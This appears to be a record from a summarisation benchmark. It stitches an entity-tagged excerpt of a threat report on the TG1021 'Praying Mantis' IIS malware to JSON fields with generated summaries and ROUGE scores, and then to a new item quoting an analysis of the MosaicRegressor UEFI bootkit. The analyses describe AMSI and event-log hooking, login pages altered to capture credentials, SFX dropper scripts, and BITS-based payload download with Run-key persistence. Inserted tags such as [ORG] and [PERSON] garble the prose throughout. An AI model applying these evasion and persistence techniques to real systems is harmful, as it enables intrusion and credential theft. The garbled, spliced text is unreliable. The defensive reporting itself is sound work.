holds defense tampering capabilities to hide its activities by applying inline hooks on specific security related functions on all the process \u2019 threads:1 . AV scanning functions \u2013 The malware hooks the functions \u201c AmsiScanBuffer \u201d and \u201c AmsiScanString \u201d from the\u201cAmsi.dll \u201d library with a simple function which returns AMSI_RESULT_CLEAN.2 . Event log reporting functions \u2013 The malware hooks the functions \u201c [PERSON] ReportEventW \u201d and \u201c EventWriteTransfer \u201d from the \u201c [PERSON] Advapi32.dll \u201d library with a simple function which returns [CARDINAL] 1 ( any non [CARDINAL] - zero value is considered as conformation that the event was written ) . By doing so the malware disables the capability of event logging from the affected process.3 . .NET codetrust checks \u2013 The malware hooksfunctions \u201c WldpQueryDynamicCodeTrust \u201d and \u201c WldpIsClassInApprovedList \u201d functions from the \u201c [GPE] Wldp.dll \u201d library . The purpose of those hooks is to bypass [ORG] Device [ORG] Guard policy and execute malicious .NET code in memory . The hook leads to yet another simple function returning S_OK value.the4 . [ORG] PowerShell related registry keys actions \u2013 The malware hooks the function \u201c RegOpenKeyExW \u201d from \u201c [PERSON] Advapi32.dll \u201d . return anincluding \u201c Software\\policies\\microsoft\\Windows\\Powershell \u201d willsubkey under orAny ERROR_FILE_NOT_FOUND error.17Figure [CARDINAL] 15 : Hooking of Anti - Virus and .NET Device Guard functionsAlthough it seems that the malware performs the hooking only on the current injected process , it holds the capability to perform this behavior on other user - land processes . The threat actor leveraged the NodeIISWeb and ExtDLL.dll malware to execute other modules , containing additional capabilities . These modules are .NET modules , which were obfuscated using [PERSON] Confuser . [PERSON] Core [CARDINAL] 1.4.1 ( build [CARDINAL] 5d92e25e43).PSRunner.dll \u201c PSRunner.dll \u201d provides the threat actor with the ability to run [ORG] PowerShell script - blocks on a host without spawning a [ORG] PowerShell process and manage incoming [ORG] PowerShell payloads . Some of the functionality of the module resembles the functionality of an open - source tool named \u201c UnmanagedPowerShell\u201d3 , which enables execution of [ORG] PowerShell script blocks from an unmanaged process . A snippet from [ORG] PSRunner code is shown below . Figure [CARDINAL] 16 : A snippet of code from PSRunner.dllForward.dll \u201c [ORG] Forward.dll \u201d enables the threat actor to forward HTTP traffic to a remote host based on a given set of parameters . The [ORG] DLL \u2019s functionality is also implemented in the NodeIISWeb malware and replicates its traffic forwarding capabilities . The traffic forwarding is done by processing an XML formatted string containing instructions , and by assembling a request with the given parameters \u2013 see Traffic Forwarding for the full list of parameter options.3 url [CARDINAL] 17 : A snippet of code from Forward.dllPotatoEx.dll \u201c [PERSON] PotatoEx.dll \u201d is a custom version of the [PERSON] Potato family tools , which is a common local privilege [ORG] Escalation ( PE ) tool . Consistent with the other tools in the threat actor \u2019s arsenal , this is a .NET version of the [PERSON] Potato family , which also has implementations of additional open - source tools such as \u201c PingCastle \u201d \u2013 also seen in \u201c BadPotato\u201d.E.dll \u201c E.dll \u201d is a lightweight .NET payload used by the threat actor to verify whether an exploit had successfully executed on a target IIS server . A successful exploit with \u201c E.dll \u201d as a payload would result in a HTTP response containing custom fabricated headers , cookies , and content . The name \u201c E.dll \u201d has a direct connection the \u201c YSoSerial . Net \u201d open - source tool used to generate payloads that exploit insecure .NET object deserialization . During preparation of payloads using \u201c YSoSerial . Net \u201d , the deserialization gadget searches for \u201c e.dll \u201d as the payload for the operation . Post - exploitation [ORG] ActivitiesThe threat actor utilized the access provided using the IIS to conduct additional activity , including credential harvesting , reconnaissance , and lateral movement . Credential harvesting The threat actor modified login webpages to record credentials and save them to a file in clear text format . The modification is a short - embedded code - block at the beginning of the webpage file with a simple try - catch phrase code:19Figure [CARDINAL] 18 : Credential tap code block modificationThe short piece of code checks the \u201c [PRODUCT] UserName \u201d and \u201c [PERSON] Password \u201d attributes in a post - back form and if both are not empty , they are stored in clear text to the designated output path . Once users would login to the website , credentials would be stored there and the threat actor could easily access the file by browsing the relevant path . The name of the output file chosen by TG1021 would resemble a native file in an existing directory with a different extension in order to blend in with legitimate requests to the server . Reconnaissance As in many other cases , the threat actor used publicly available offensive security tools ( [ORG] OST ) in order to perform reconnaissance . For example , \u201c SharpHound \u201d was used to scan and map targets by loading it directly to infected machines memory without writing the binary on the disk . Quickly after the execution , the threat actor retrieved the output files and deleted them . In addition , \u201c PowerSploit \u201d was loaded and executed using the same technique . Lateral Movement After establishing foothold on an external IIS server , the threat actor access shared folders on internal web servers over [ORG] SMB using compromised domain credentials . On several occasions the threat actor dropped the NodeIISWeb web shell loader via SMB to compromise additional servers . Additionally , the threat actor utilized the exploits mentioned above to move laterally between IIS servers . Similarities to the Copy - Paste threat actorThe [ORG] Tactics , Techniques and Procedures ( TTPs ) used by TG1021 , bare various similarities to those of \u201c Copy [WORK_OF_ART] - Paste [WORK_OF_ART] Compromises \u201d actor described by [ORG] the [ORG] Australian [ORG] Cyber [ORG] Security [ORG] Centre ( ACSC ) . The advisory , published in [DATE] June [DATE] 2020 , details the TTPs of a sophisticated state - sponsored actor targeting [NORP] Australian public and private sector organizations . Much like TG1021 , the threat actor described in the advisory utilizes a variety of deserialization exploits and specifically the Telerik UI vulnerabilities and VIEWSTATE handling in [ORG] Microsoft IIS servers . There are major overlaps in the toolsets used by both actors , such as the usage of [GPE] JScript payloads , [PERSON] Potato family malware and \u201c [WORK_OF_ART] Confuser \u201d for obfuscation . The \u201c PowerHunter \u201d malware described in the advisory provides extremely unique functionality , high similar to \u201c ExtDLL.dll \u201d described in this report . It is important to note the activity described in the advisory is wider and consists of additional tactics , techniques and procedures that were not observed in the activities analyzed by [GPE] Sygnia . Defending Against TG1021 AttacksAs a volatile threat actor , defending against TG1021 attacks is a tough task . We recommend the following:1 . Patching .NET deserialization vulnerabilities2 . Searching for known indicators of compromise3 . Scanning internet facing IIS servers with a set of [ORG] Yara rules designed to detect the tools discussed in this paper204 . Actively hunt for suspicious activity on internet - facing IIS environmentsSealing .NET [ORG] Deserialization [ORG] Exploits [ORG] & [ORG] Best [ORG] Practices [CARDINAL] 1 . [ORG] Telerik [ORG] Version [ORG] Update \u2013 If you are running a .NET web application that uses Telerik UI for ASP.NET AJAX , make sure to use the newest version that is not vulnerable to known [PRODUCT] CVEs.2 . Enforce VIEWSTATE [ORG] MAC validation and [ORG] Rotate [ORG] Machine [ORG] Keys Routinely \u2013 VIEWSTATE deserialization attacks can easily lead to a network compromise due to a small misconfiguration . Version [CARDINAL] 4.5 of .NET enforces the relevant security measures of validating VIEWSTATE messages before attempting deserialization . Make sure the following configurations are in place : \u2022 Ensure the \u201c enableViewStateMac \u201d variable in the IIS configuration is set to True . \u2022 Ensure the \u201c aspnet : AllowInsecureDeserialization \u201d variable in the IIS configuration is set to False.\u2022 Ensure the registry key \u201c AspNetEnforceViewStateMac \u201d under the path\u201cHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\.NETFramework\\<Version > \u201d is set to [CARDINAL] 1.In addition to these security measures , encryption and validation keys should be handled with care as sensitive credentials . If possible , use auto - generated keys , otherwise routinely rotate the machine keys on your IIS servers to make sure you would not be susceptible to attacks where keys were stolen or leaked.3 . Validate any usage of VSTATE in .NET applications \u2013 If any of the .NET web applications running in your environment use the compressed version of [ORG] VIEWSTATE ( whether homebrew or a [ORDINAL] third - party application ) , validate the implementation is done securely . Search for the following piece of code in your applications , and make sure they are replaced : Figure [CARDINAL] 19 : Insecure implementation of compressed [ORG] VIEWSTATE4 . Secure ASP.NET session DB \u2013 If ASP.NET session state is used by your web applications make sure access to the database can only be done from legitimate network locations . Separate session state [ORG] MSSQL databases between different IIS servers / web applications as much as possible or create different [ORG] SQL users with proper minimal [ORG] CRUD permissions.5 . [ORG] Block any unnecessary communications from IIS servers \u2013 Your IIS servers should only generate traffic matching the set of known rules , limit and block these activities to the minimum possible.6 . Configure a suitable application pool identity to run the web application \u2013 Make sure your .NET web applications are running with a designated application pool identity with the lowest privileges possible . This would create an additional obstacle for TG1021.21Indicators of Compromise \u2022 Malicious HTTP Identifiers :o [ORG] User agent hard - coded in the tools \u2013 \u201c Mozilla/5.0+(Windows+NT+10.0;+WOW64;+Trident/7.0;+rv:11.0)+like+Gecko\u201do HTTP parameter and cookie \u2013 \u201c AESKey \u201d o HTTP parameter \u2013 \u201c _ _ VSTATEGENERATOR\u201d23MITRE [PERSON] ATT&CK [PERSON] Breakdown1 . ReconnaissanceT1595.002 - Active Scanning : Vulnerability ScanningT1592 \u2013 [PERSON] Gather [PERSON] Victim [PERSON] Host InformationT1590 \u2013 Gather Victim Network Information2 . Resource DevelopmentT1587.001 - Develop Capabilities : [ORG] MalwareT1587.004 [ORG] - [ORG] Develop [ORG] Capabilities : Exploits3 . Initial AccessT1190 - Exploit Public - Facing Application4 . [ORG] ExecutionT1059.001 [ORG] - [ORG] Command and Scripting Interpreter : PowerShellT1059.007 - Command and Scripting Interpreter : JavaScript / JScript5 . PersistenceT1505.003 \u2013 Web Shell6 . Privilege EscalationT1055.001 - Process Injection : Dynamic - link Library InjectionT1055.001 - Process Injection : Dynamic - link [PERSON] Library [PERSON] InjectionT1068 [PERSON] \u2013 [PERSON] Exploitation [PERSON] for [PERSON] Privilege [PERSON] Escalation7 . Defense EvasionT1036.005 - Masquerading : [PERSON] Match [PERSON] Legitimate [PERSON] Name or [PERSON] LocationT1036.005 [PERSON] - [PERSON] Masquerading : [PERSON] Match [PERSON] Legitimate [PERSON] Name or [ORG] LocationT1140 [ORG] - Deobfuscate / Decode [ORG] Files or InformationT1070.004 - Indicator Removal on Host : File DeletionT1134.001 - Access Token Manipulation : Token Impersonation / TheftT1562.002 - Impair Defenses : Disable Windows Event LoggingT1078.002 \u2013 Domain AccountsT1027.002 \u2013 Software Packing8 . Credential [PERCENT] AccessT1056.003 [PERCENT] - [PERCENT] Input Capture : Web Portal Capture9 . [ORG] DiscoveryT1135 [ORG] - [ORG] Network [ORG] Share [ORG] DiscoveryT1083 [ORG] - [ORG] File [ORG] and [ORG] Directory [ORG] Discovery2410 . Lateral MovementT1550.004 - Use Alternate Authentication Material : Web Session CookieT1021.002 - Remote Services : SMB / Windows Admin SharesT1210 - Exploitation of Remote ServicesT1570 - Lateral Tool Transfer11 . CollectionT1005 - Data from [PERSON] Local [PERSON] System12 . Command and ControlT1071.001 - Application Layer Protocol : Web ProtocolsT1001 \u2013 Data ObfuscationT1090.001 \u2013 Internal ProxyT1132.001 - Data Encoding : Standard EncodingT1573.001 - Encrypted Channel : Symmetric CryptographyT1572 - Protocol TunnelingAbout Sygnia [GPE] Sygnia is a cyber technology and services company , providing high - end consulting and incident response support for organizations worldwide . Sygnia works with companies to proactively build their cyber resilience and to respond and defeat attacks within their networks . It is the trusted advisor and cyber security service provider of IT and security teams , senior managements and boards of leading organizations worldwide , including Fortune 100 companies . For more information : www.sygnia.co94a [PERSON] Yigal [PERSON] Alon [PERSON] St. , [DATE] 29th floor , [GPE] Tel [GPE] Aviv , [GPE] Israel , [DATE] 6789155488 Madison Ave . , [ORDINAL] 11th floor , [GPE] New [GPE] York , [GPE] NY , [GPE] USA , [DATE] 1002252 [ORG] Tras [ORG] St. , [ORDINAL] 2nd", "generated_text": "the document; the operation; TG1021; Praying Mantis; organizations; internet-facing servers; the attackers; a custom malware framework; the Windows IIS environment; the malware; logging; incoming connections; the DLL; the attackers; persistence; logging; incoming connections; C2; the server; control; the malware; the attackers; detection; the attackers; the Windows IIS platform; the attackers; sirens; detection; commands; the network; the process; payload; the persistence; other malware; a return; a backdoor; additional modules; the network; the threat actor; 0-day exploits.", "ref_text": "<START-1>The document analyzes an advanced cyber threat actor dubbed \"Praying Mantis\" by the cybersecurity company Sygnia. Praying Mantis conducted intrusion campaigns targeting prominent organizations by exploiting internet-facing servers, mainly using .NET deserialization attacks against Windows IIS servers. Praying Mantis utilized a custom, completely memory-resident malware toolkit tailored for IIS servers. The core implant NodeIISWeb intercepts all HTTP traffic and provides backdoor access. It can load additional modules, execute payloads, and forward traffic to other backdoors. A second stealthy backdoor ExtDLL.dll listens passively for commands. The toolkit includes loaders to inject the malware via exploits as well as web shells for control. Modules extend functionality for reconnaissance, credentials theft, lateral movement, privilege escalation and more. Praying Mantis was very focused on stealth, tampering with logging and actively removing tools after use. Tactics and tools correlate strongly with a threat actor tracked as \"Copy Paste\" by Australia's cyber security agency. Overlaps include deserialization exploits, JScript execution, obfuscation, and shared malware capabilities. The report provides indicators of compromise and recommendations for defending against such intrusions by securing internet-facing servers and .NET apps. Overall, the report profiles the sophisticated tradecraft and IIS malware platform of an advanced cyber threat actor that compromised multiple high-value targets through stealthy means. It provides insight into the actor's capabilities, while also informing potential victims. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.43243243243243246, "gpt3/lexical/rouge_rouge2": 0.12499999999999997, "gpt3/lexical/rouge_rougeL": 0.2702702702702703, "gpt3/lexical/rouge_rougeLsum": 0.2702702702702703, "gpt3_generated_text": ["This article discusses the activities of an advanced and persistent threat actor known as TG1021 or \"Praying Mantis\". The attackers target prominent organizations by exploiting internet-facing servers, particularly those running Windows IIS. They use deserialization attacks and a custom malware platform tailored for the Windows IIS environment. The attackers show expertise in the Windows IIS platform and utilize 0-day exploits. They employ a volatile malware framework that intercepts and handles HTTP requests on the server, effectively evading detection. The attackers also remove all disk-resident tools after use to maintain stealth. Their tactics, techniques, and procedures align with those described in an advisory by the Australian Cyber Security Centre. The article provides details on the various exploits used by TG1021, the malware infrastructure, and post-exploitation activities. It also emphasizes the importance of defending against these attacks and provides best practices to mitigate the risk."]}, {"split_name": "val", "sample_id": "val_115", "prompt_text": "Extract the keywords: MosaicRegressor : Lurking in the [WORK_OF_ART] Shadows [WORK_OF_ART] of [WORK_OF_ART] UEFITechnical [WORK_OF_ART] detailsContentsUEFI [WORK_OF_ART] Bootkit [WORK_OF_ART] RAR SFX droppers for the [ORG] Curl - based downloaders BITS DownloadersMain thread [ORG] C&C [ORG] Communication [ORG] BITS [ORG] Transfer Loading the [ORG] DLL modules [ORG] BITS [ORG] Downloader , extended [ORG] BITS [ORG] Downloader , extended , MSVC [CARDINAL] 10 version BITS Downloader , \u201c HHDump.dll \u201d BITS Downloader , \u201c cryptui.sep \u201d BITS Downloader , [CARDINAL] 64 - bitCurl - based downloadersC&C communication [PERSON] Payload [PERSON] ABI [PERSON] Notable file properties [ORG] C&C URLs Payload DLL names [ORG] C&C communication delay [ORG] Curl - based downloader , extended [ORG] C&C communication [PERSON] Payload [PERSON] Curl downloader , \u201c OINFO11.OCX \u201d Rich header dump WinRAR wrapper \u201c load.rem \u201d Load Intermediate [ORG] DLL loader \u201c mapisp.dll \u201d CryptoSysPrepE - mail downloader\u201cProcess \u201d functionOLE2 Equation dropperPayload of the OLE2 dropper , \u201c Data.dll\u201dLauncher for the Curl downloader Winhttp - based downloaders , extendedC&C addresses and file names Modification with the \u201c ID \u201d field [ORG] C&C addresses and file names23 30MosaicRegressor is a multi - stage and modular framework aimed at espionage and data gathering . It consists of downloaders , and occasionally multiple intermediate loaders , that are intended to fetch and execute payload on victim machines . In [CARDINAL] two known cases , the initial stage of the framework was installed in the victim \u2019s UEFI firmware , achieving the above - OS level of persistence . UEFI BootkitWhen inspecting the compromised UEFI firmware , we noticed [CARDINAL] four components that had unusual proximity in their assigned [ORG] GUID values . These were [CARDINAL] two [ORG] DXE drivers and [CARDINAL] two UEFI applications . Upon closer analysis , we could conclude that those were compiled from the source code of a [ORG] Hacking [ORG] Team bootkit named [ORG] VectorEDK , that was leaked in [DATE] 2015 and is now available online . Rogue components found within the compromised UEFI firmwareFollowing is an outline of the revealed components : [PERSON] F5B320F7E87CC6F9D02E28350BB87DE6 ( SmmInterfaceBase ) DD8D3718197A10097CD72A94ED223238 ( Ntfs)\u2022 SmmInterfaceBase : a [ORG] DXE driver intended to deploy the bootkit itself on the system by registering a callback that willbe invoked upon an event of type EFI_EVENT_GROUP_READY_TO_BOOT . The event occurs at a point when control can be passed to the operating system \u2019s bootloader , effectively allowing the callback to take effect before it . The callback will , in turn , load and invoke further components of the bootkit , in this case \u2018 SmmAccessSub \u2019 . This is equivalent to [ORG] Hacking [ORG] Team \u2019s [ORG] \u2018 rkloader \u2019 component , and is built using its source code.\u2022 [PERSON] Ntfs : a driver used to parse the [ORG] NTFS file system to allow reading or writing to disk.\u2022 [ORG] SmmReset : a [ORG] UEFI application intended to mark the execution of the bootkit . This is done by setting the value of avariable named [WORK_OF_ART] \u2018 [WORK_OF_ART] fTA \u2019 to a hard - coded [ORG] GUID . The same is done by the original Vector - EDK bootkit as part of the bootkit \u2019s main business logic . In this case , it \u2019s not invoked and it seems to be a residue from the open source code that was not properly leveraged by the developers . Setting of the [ORG] fTA variable with a predefined [ORG] GUID to mark the execution of the bootkit3\u2022 SmmAccessSub : the main bootkit component that serves as a persistent dropper for user - mode malware . It is executed by the callback registered during the execution of \u2018 SmmInterfaceBase \u2019 , and takes care of writing a binary embedded within it as a file named \u2018 IntelUpdate.exe \u2019 to the startup directory on disk . This allows the binary to run when Windows accomplishes the boot process . This is the only proprietary component amongst the ones we inspected , which does n\u2019t rely on Vector - EDK code . It conducts the following actions to drop the intended file to disk : \u2013 [ORG] Bootstraps pointers for [ORG] SystemTable , [ORG] BootServices and [ORG] RuntimeServices global structures . \u2013 Tries to get a handle to the currently loaded image by invoking the HandleProtocol method with the EFI_LOADED_IMAGE_PROTOCOL_GUID argument . \u2013 If it succeeds , it attempts to find the root drive with Windows installation by enumerating all drives and checking that the \u2018 \\Windows\\System32 \u2019 directory exists . A global [ORG] EFI_FILE_PROTOCOL object that corresponds to the drive will be created at this point and referenced to open any further directories or files on this drive . \u2013 If the root drive is found , it looks for a marker file named \u2018 setupinf.log \u2019 under the Windows directory and proceeds onlyif it does n\u2019t exist . In the absence of this file , it is created . \u2013 If the creation of \u2018 setupinf.log \u2019 succeeds , it goes on to check if the \u2018 Users \u2019 directory exists on the same drive . \u2013 If the \u2018 Users \u2019 directory exists , it writes the \u2018 IntelUpdate.exe \u2019 file ( embedded in the [ORG] UEFI application \u2019s binary ) under the\u2018\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup \u2019 directory . Code from \u2018 SmmAccessSub \u2019 used to write the embedded \u2018 IntelUpdate.exe \u2019 binary to the Windows startup directory4RAR SFX droppers for the [NORP] Curl - based downloadersThese are several SFX droppers with decoy documents that were sent to victims by e - mail . Each contains a document and Path=%appdata% Setup=%appdata%\\1.docx Setup=%appdata%\\msreg.exe Path=%appdata% Setup=%appdata%\\6.docx Setup=%appdata%\\msreg.exe Simplified [NORP] Chinese font \u201c SimSun \u201d but is unreadable and looks like a result of incorrect encoding . RAR SFX script : [ORG] Path=%appdata% [ORG] Setup = winword.exe Setup = contract.doc Path=%appdata% Setup=%appdata%\\6.docx Setup=%appdata%\\msreg.exe Simplified [NORP] Chinese font \u201c SimSun \u201d but is unreadable and looks like a result of incorrect encoding . RAR SFX script : [ORG] Path=%appdata% [ORG] Setup = winword.exe Setup = contract.doc Path=%appdata% Setup = [ORG] dwhost.exe [ORG] Setup=0612.doc [ORG] Path=%appdata% [ORG] Setup = return.exe Setup=1206.doc Path=%appdata% Setup = dwhost.exe Setup=0927.doc Silent=1 display name \u201c test \u201d of type BG_JOB_TYPE_UPLOAD . It creates a mutex to ensure [CARDINAL] only [CARDINAL] one instance is being executed.10Mutex name : \u201c FindFirstFile Message Bi\u201dEnumerates all BITS jobs . For a job whose display name contains the substrings \u201c first_tf \u201d or \u201c second_tf \u201d and overall display name is [CARDINAL] five or [CARDINAL] six characters ( this never happens since the conditions are contradictory ) , it cancels the job , effectively interrupting the transfer and removing temporary files . Then the module follows its business logic in a separate thread while running an empty window message loop in the startup thread . Main thread The program contains [CARDINAL] four blocks of data encrypted with a simple [QUANTITY] one - byte XOR algorithm . [CARDINAL] Three of those blocks contain URL strings and the [ORDINAL] fourth contains a unique string , \u201c D22\u201d . It builds an identification string following the format : [ORG] % Computer [ORG] name%-D22_32 or [DATE] 64The [DATE] 32 or [DATE] 64 suffix is chosen based on system identification . The system is supposed to be [CARDINAL] 64 if the program is able to locate the file or directory named % WINDIR%\\SysWOW64The program then follows into an infinite [ORG] C&C communication loop . It delays for a hardcoded period of [TIME] 20 [TIME] minutes between each attempt . [ORG] C&C [ORG] Communication The module compiles a final URL string following the format : URL from the decrypted buffer / identification string / on.zIt then attempts to download the contents of that URL to the file % TEMP%\\on.dat using its BITS transfer routine . The contents of the file areignored and the file is deleted immediately after transfer . This initial download is used to determine the valid [ORG] C&C server . The module iterates through all [CARDINAL] three URLs hardcoded in its body and uses the [ORDINAL] first one that responds without error for further communication . In case any of the [ORG] C&C servers provided a valid response , the program sends another download request for : URL of the valid [ORG] C&C server / identification string / BeFileA.z The downloaded contents are then saved to : % [PERSON] TEMP%\\BeFileA.dllIt also tries to fetch the file using the URL : URL of the valid [ORG] C&C server / identification string / BeFileC.z and save it to : % TEMP%\\BeFileC.dllThe file \u201c BeFileA.dll \u201d is downloaded only once during the duration of the program \u2019s instance and is loaded in a separate thread . The attempts to download the file \u201c BeFileC.dll \u201d occur in every communication period . The file is loaded in the same thread . BITS Transfer The program creates a new BITS job . For a download job it names the job \u201c first_tf \u201d and for the upload tasks it uses the name \u201c second_tf \u201d . Other versions use slightly different strings as job names but they all start with \u201c [ORDINAL] first \u201d and \u201c [ORDINAL] second \u201d correspondingly , and are always identical to the names of the jobs that are cancelled during the startup . The job is started with the priority setting \u201c BG_JOB_PRIORITY_FOREGROUND \u201d . It also toggles the security options \u201c [WORK_OF_ART] BG_SSL_IGNORE _ CERT_CN_INVALID \u201d , \u201c [ORG] BG_SSL_IGNORE_CERT_DATE_INVALID \u201d , \u201c BG_SSL_IGNORE_UNKNOWN_CA \u201d , to accept invalid HTTPS certificates . It then waits for up to [TIME] about [TIME] five [TIME] minutes for the BITS job to complete , also extending the wait if the actual transfer is in progress.11Loading the [ORG] DLL modules The module expects the files provided by the [ORG] C&C server to be [ORG] PE DLLs . They are loaded normally using the LoadLibrary API function . Each [ORG] DLL may have [CARDINAL] one or more exported functions named \u201c CallA \u201d , \u201c CallB \u201d , \u201c CallC \u201d , \u201c CallD \u201d , \u201c CallE\u201d . All exported functions are supposed to have the same [ORG] ABI : cdecl calling convention , [CARDINAL] five arguments all passed by pointers . Following the execution of each function the program delays for [TIME] one [TIME] second and then processes the results returned in these arguments . Depending on the data returned by the exported function , the program may then download or upload arbitrary files from / to arbitrary URLs using its BITS transfer routine . Also , depending on the returned data , it may delete or leave the DLLs file on disk . Then it checks if a corresponding \u201c dat \u201d file exists in the % TEMP%directory . In case the file exists it uploads it to the [ORG] C&C server using the BITS transfer routine , the same URL except the last component is identical to the actual filename . The different mutex name : \u201c set instance state\u201d . After starting the [ORG] C&C communication thread , the program sets the registry value HKEY_CURRENT_USER\\Software\\ Microsoft\\Windows\\CurrentVersion\\Run , value name qwinstd , to the location of its own executable . It also overwrites the value if it is not equal to the location of the executable . This ensures the program \u2019s automatic startup . Also the program sets up a timer callback routine to be called every second . The routine looks for the file % APPDATA%\\Microsoft\\Internet Explorer\\usk.rs . When such a file is found it acts as a kill switch : the file deleted , the BITS Jobs are cancelled and the program exits . Instead of the % TEMP% directory this version uses the directory % APPDATA%\\Microsoft\\Internet Explorer to store its temporary files.12System information The module creates a text file % APPDATA%\\Microsoft\\Internet Explorer\\%Computername%.dat and fills it with system information . Note the non - ASCII symbols 0xA3 and [FAC] 0xBE used in the string literals . These were replaced with a colon character ( See \u201c Language artifacts\u201d).Host Infomation : EXE ID : % Unique ID , see table% Host Name : % Computername% Current User Name : % USERNAME% PRIVILEGE : [PERSON] % User privilege% OS : Windows NT % Major%.%Minor%\\t%Service pack string%\\t%Product type%\\tSystemMetrics : % Build number for [DATE] Windows [DATE] 5.2%\\tSuiteMask hex : % Suite mask% OS BITS : % [CARDINAL] 32 or [PERCENT] 64 [PERCENT] % [ORG] Host [ORG] Power [ORG] ON Time : [ORG] % [PERCENT] 04d-%02d-%02d [PERCENT] % 02d:%02d Power ON Time : % d Hours % [PERCENT] 2d [PERCENT] Minutes [PERCENT] % [TIME] 2d [TIME] Seconds * or*Power [ORG] ON Time : [ORG] % 2d [PERCENT] Minutes [PERCENT] % 2d Seconds Installed Programe List 32 : * the following list is the contents of registry keys from HKLM\\SOFTWARE\\Microsoft\\Windows\\ CurrentVersion\\Uninstall * * % Item number% * * % Registry key last write timestamp in format % [PERCENT] 04d-%02d-%02d [PERCENT] % 02d:%02d% * * optional , when the program determines that it is running on a [QUANTITY] 64 - bit OS , it disables [CARDINAL] 64/32 registry reflection and enumerates the installed program list again , generating a similar list with a header \u201c [WORK_OF_ART] Installed [WORK_OF_ART] Programe [WORK_OF_ART] List 64\u201d*Remarks . The % User privilege% string is produced using the [FAC] NetUserGetInfo API for the current user . Depending on the returned result , it can be one of the strings : \u201c Administrator \u201d , \u201c User \u201d , \u201c Guest \u201d , \u201c ACCESS_DENIED \u201d , \u201c COMPUTER _ NAME_ERROR \u201d , \u201c USER_NAME_ERROR \u201d . The % Product type% string is one of \u201c VER_NT_SERVER\u201d,\u201cVER_NT_DOMAIN _ [ORG] CONTROLLER \u201d , \u201c VER_NT_WORKSTATION\u201dOnce the report file is ready , the program creates a BITS job to upload it to the [ORG] C&C server . The upload location follows the format : URL of the [ORG] C&C server/%Computername%.dat The file is deleted if the upload succeeds.13Payload When finished with uploading the system information report , the program then attempts to fetch the payload from the [ORG] C&C server . The business logic is similar to the one of the \u201c BITS Downloader \u201d , with the following differences : Files that are downloaded and executed in separate threads : FileA.dll fetched from % C&C URL%/%Computername%/FileA.zFileB.dll fetched from % C&C URL%/%Computername%/FileB.zFiles that are downloaded and executed in the current thread : FileC.dll fetched from % C&C URL%/%Computername%/FileC.zFileD.dll fetched from % [ORG] C&C URL%/%Computername%/FileD.zEach [ORG] DLL may have [CARDINAL] one or more exported functions named \u201c CallA \u201d , \u201c CallB \u201d , \u201c CallC \u201d , \u201c CallD \u201d , \u201c CallE \u201d , \u201c CallF \u201d , \u201c [PERSON] CallG \u201d , \u201c CallH \u201d , Many strings contain the sequence 0xA3 , 0xBE ( hexadecimal ) . This is an invalid sequence for a UTF8 string and the [ORG] LATIN1 encoding translates these symbols to a pound sign followed by a \u201c masculine ordinal indicator \u201d ( \u201c \u00a3 \u00ba\u201d).\u0414anguage artifactsAn attempt to iterate over all available iconv symbol tables trying to convert to [GPE] UTF-8 produces possible candidates that produce a more meaningful conversion for this byte sequence : CN - GB// , \u201c : \u201d [MONEY] # [MONEY] EF [ORG] BC [CARDINAL] 9A CP936// , \u201c : \u201d [MONEY] # [MONEY] EF [ORG] BC 9A CP949// , \u201c : \u201d [MONEY] # [MONEY] EF [ORG] BC 9A CSEUCKR// , \u201c : \u201d [MONEY] # [MONEY] EF [ORG] BC [CARDINAL] 9A [ORG] CSGB2312// , \u201c : \u201d [MONEY] # [MONEY] EF [MONEY] BC [CARDINAL] 9A EUC - CN// , \u201c : \u201d [MONEY] # [MONEY] EF [MONEY] BC [CARDINAL] 9A EUC - KR// , \u201c : \u201d [MONEY] # [MONEY] EF [MONEY] BC 9A EUCCN// , \u201c : \u201d [MONEY] # [MONEY] EF [ORG] BC 9A EUCKR// , \u201c : \u201d [MONEY] # [MONEY] EF [MONEY] BC [CARDINAL] 9A GB2312// , \u201c : \u201d [MONEY] # [MONEY] EF [ORG] BC [CARDINAL] 9A GB13000// , \u201c : \u201d [MONEY] # [MONEY] EF [ORG] BC 9A GB18030// , \u201c : \u201d [MONEY] # [MONEY] EF [ORG] BC [CARDINAL] 9A [CARDINAL] GBK// , \u201c : \u201d [MONEY] # [MONEY] EF [ORG] BC 9A ISIRI-3342// , \u201c ! : \u201d # [MONEY] 21 [ORG] 3A ISIRI3342// , \u201c ! : \u201d # [MONEY] 21 [CARDINAL] 3A MS936// , \u201c : \u201d [MONEY] # [MONEY] EF [MONEY] BC 9A MSCP949// , \u201c : \u201d [MONEY] # [MONEY] EF [ORG] BC 9A OSF0004000A// , \u201c : \u201d [MONEY] # [MONEY] EF [ORG] BC 9A OSF100203B5// , \u201c : \u201d [MONEY] # [MONEY] EF [MONEY] BC 9A UHC// , \u201c : \u201d [MONEY] # [MONEY] EF [MONEY] BC [CARDINAL] 9A WINDOWS-936// , \u201c : \u201d [MONEY] # [MONEY] EF BC [CARDINAL] 9A Given the context of the string preceding the symbol and line feed symbols following it , the best match is the \u201c FULLWIDTH empty ; all the business logic is implemented in the [ORG] DllMain function . The [ORG] DllMain function , when executed with the reason code of DLL_PROCESS_ATTACH , checks if the filename of the host The module checks for the presence of [PERCENT] the [PERCENT] file [PERCENT] % APPDATA%\\Microsoft\\Windows\\load.rem . If the file is present it follows in a new thread : it copies it to % APPDATA%\\Microsoft\\Windows\\SendTo\\load.dll , then loads the copy as a regular [ORG] DLL and calls its function exported with the name \u201c [WORK_OF_ART] Load \u201d , if present . The copy is deleted if the module fails to load it as a DLL.Main thread The module enumerates and cancels BITS jobs if their names contain a substring \u201c [ORDINAL] first job \u201d or \u201c [ORDINAL] second job \u201d and the length of the name is either [CARDINAL] 9 or 10 . This is an improvement over the original \u201c BITS Downloader \u201d that checked for a contradictory condition that never becomes true . The module creates a directory if it does n\u2019t exist : % APPDATA%\\Microsoft\\Network . Due to a bug , it will not attempt to create the directory if a file exists with the same name , failing later when the directory is required . This directory is then used to store any temporary files , instead of % TEMP% in the original \u201c BITS Downloader\u201d . Files that are downloaded and executed in separate threads : DFileA.dll fetched from % C&C URL%/%Computername%/DFileA.zDFileD.dll fetched from % [ORG] C&C URL%/%Computername%/DFileD.zFiles that are downloaded and executed in the current thread : DFileC.dll fetched from % C&C URL%/%Computername%/DFileC.zExported function names executed from the payload DLLs : \u201c CallA \u201d , \u201c CallB \u201d , \u201c CallC \u201d , \u201c CallD \u201d , \u201c CallE \u201d , \u201c CallF \u201d 